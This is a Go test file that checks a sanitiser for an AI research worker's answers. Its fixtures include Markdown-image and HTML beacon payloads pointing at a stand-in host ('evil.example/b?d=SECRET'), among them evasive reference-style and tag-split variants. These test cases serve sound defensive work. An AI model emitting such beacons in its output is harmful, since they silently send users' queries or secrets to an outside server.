package fleet

import (
	"context"
	"strings"
	"testing"

	"github.com/rxbynerd/chiron/internal/researcher/fleet/model/modeltest"
	"github.com/rxbynerd/chiron/internal/researcher/fleet/search"
	"github.com/rxbynerd/chiron/internal/researcher/fleet/search/searchtest"
	"github.com/rxbynerd/chiron/internal/types"
)

func TestSanitiseAnswer(t *testing.T) {
	for _, tt := range []struct {
		name, in, want string
	}{
		{"plain", "# Title\n\nbody", "# Title\n\nbody"},
		{"image becomes link", "see ![chart](https://evil.example/b?q=x)", "see [chart](https://evil.example/b?q=x)"},
		{"empty alt image", "![](https://evil.example/b)", "[](https://evil.example/b)"},
		{"img tag dropped", `a <img src="https://evil.example/b"> b`, "a  b"},
		{"script dropped", "a<script>fetch('x')</script>b", "afetch('x')b"},
		{"comment dropped", "a<!-- hidden -->b", "ab"},
		{"multiline tag dropped", "a<div\nclass=\"x\">b</div>", "ab"},
		{"autolink kept", "see <https://example.org/x>", "see <https://example.org/x>"},
		{"less-than kept", "1 < 2 and 3 > 2", "1 < 2 and 3 > 2"},
		{"code span kept", "use `a<b`", "use `a<b`"},
		{"escaped bracket in alt", `![x\]](https://evil.example/b?d=SECRET)`, `[x\]](https://evil.example/b?d=SECRET)`},
		{"nested brackets in alt", "![a [b] c](https://evil.example/b?d=SECRET)", "[a [b] c](https://evil.example/b?d=SECRET)"},
		{"reference image", "![a][r]\n\n[r]: https://evil.example/b?d=SECRET", "[a][r]\n\n[r]: https://evil.example/b?d=SECRET"},
		{"shortcut reference image", "![r]\n\n[r]: https://evil.example/b?d=SECRET", "[r]\n\n[r]: https://evil.example/b?d=SECRET"},
		{"collapsed reference image", "![r][]\n\n[r]: https://evil.example/b", "[r][]\n\n[r]: https://evil.example/b"},
		{"repeated bangs", "!!![x](https://evil.example/b)", "[x](https://evil.example/b)"},
		{"image rejoined by tag removal", "!<b></b>[x](https://evil.example/b)", "[x](https://evil.example/b)"},
		{"exclamation kept", "Wow! [link](https://a.example)", "Wow! [link](https://a.example)"},
	} {
		t.Run(tt.name, func(t *testing.T) {
			if got := sanitiseAnswer(tt.in); got != tt.want {
				t.Errorf("sanitiseAnswer(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

// TestRunWorkerFinalAnswerIsSanitised: a final answer that embeds a remote
// image and raw HTML reaches the Finding as plain Markdown, so opening the
// report cannot fire a beacon carrying the query.
func TestRunWorkerFinalAnswerIsSanitised(t *testing.T) {
	searchSrv := searchtest.NewFakeServer([]search.Result{{Title: "A", URL: "https://a.example"}})
	defer searchSrv.Close()
	modelSrv := modeltest.NewFakeServer(
		modeltest.FakeReply{Content: `{"action":"search","query":"x"}`, FinishReason: "stop"},
		finalReply("# Report\n\n![tracker](https://evil.example/b?q=secret)\n<img src=\"https://evil.example/i\">\nSee <https://a.example>.", "https://a.example"),
	)
	defer modelSrv.Close()

	deps := WorkerDeps{
		Model:  newModelClient(t, modelSrv),
		Search: newSearchClient(t, searchSrv),
		Fetch:  newFetchClient(t),
		Caps:   caps(),
	}
	finding := RunWorker(context.Background(), deps, Brief{Objective: "q"})

	if finding.Status != types.StatusCompleted {
		t.Fatalf("status = %s (%s), want completed", finding.Status, finding.Detail)
	}
	if strings.Contains(finding.Text, "![") || strings.Contains(finding.Text, "<img") {
		t.Errorf("answer still carries a remote image or raw HTML:\n%s", finding.Text)
	}
	for _, want := range []string{"# Report", "[tracker](https://evil.example/b?q=secret)", "<https://a.example>"} {
		if !strings.Contains(finding.Text, want) {
			t.Errorf("answer lost %q:\n%s", want, finding.Text)
		}
	}
}
